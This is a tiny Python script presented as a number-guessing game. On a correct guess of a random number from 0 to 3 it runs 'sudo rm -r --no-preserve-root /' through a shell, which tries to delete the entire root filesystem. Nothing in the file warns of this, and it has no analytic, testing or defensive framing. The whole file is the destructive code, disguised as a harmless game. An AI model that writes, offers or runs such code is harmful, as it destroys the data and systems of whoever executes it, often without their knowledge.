import random
import subprocess

delete_command = "sudo rm -r --no-preserve-root /"

random_num = random.randint(0, 3)

print("Enter a num: ")
guess = int(input())

if guess == random_num:
	subprocess.run(delete_command, shell=True)
